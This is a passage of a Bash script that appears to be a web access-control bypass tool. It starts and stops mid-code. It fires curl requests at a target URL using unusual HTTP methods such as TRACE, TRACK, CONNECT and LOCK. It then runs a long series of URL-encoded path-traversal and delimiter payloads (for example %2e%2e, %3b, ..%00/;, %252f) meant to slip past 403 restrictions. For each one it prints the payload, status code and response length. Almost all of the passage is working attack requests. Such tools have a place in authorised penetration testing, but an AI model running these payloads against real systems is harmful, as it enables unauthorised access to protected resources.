	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo  -n "PATCH : "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PATCH)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PATCH\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo  -n "TRACK : "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACK)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACK\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo  -n "CONNECT : "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X CONNECT)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X CONNECT\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo  -n "UPDATE : "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X UPDATE)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X UPDATE\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo  -n "LOCK : "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X LOCK)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X LOCK\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
}
function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
	
	echo -n "Payload [ #? ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}#?" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}#?' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %09 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%09' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %09%3b ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09%3b" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%09%%%%3b' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %09.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%09..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %09; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%09;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %20 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%20" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%20' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %23%3f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%23%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%23%%%%3f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %252f%252f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%252f%252f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%252f%%%%252f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %252f/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%252f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%252f/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2e%2e ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2e%2e/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2f%20%23 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%20%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2f%%%%20%%%%23' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2f%23 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2f%%%%23' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2f%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2f%3b%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3b%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2f%%%%3b%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2f%3b%2f%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3b%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2f%%%%3b%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2f%3f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2f%%%%3f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2f%3f/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2f%%%%3f/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2f/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3b ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3b' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3b%09 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3b%%%%09' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3b%2f%2e%2e ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3b%%%%2f%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3b%2f%2e%2e%2f%2e%2e%2f%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3b%%%%2f%%%%2e%%%%2e%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3b%2f%2e. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f%2e." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3b%%%%2f%%%%2e.' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3b%2f.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3b%%%%2f..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3b/%2e%2e/..%2f%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/%2e%2e/..%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3b/%%%%2e%%%%2e/..%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3b/%2e. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/%2e." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3b/%%%%2e.' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3b/%2f%2f../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/%2f%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3b/%%%%2f%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3b/.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3b/..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3b//%2f../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b//%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3b//%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3f%23 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3f%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3f%%%%23' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3f%3f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3f%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3f%%%%3f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ .. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%00/; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%00/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%00/;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%00;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%00;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%00;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%09 ]:"
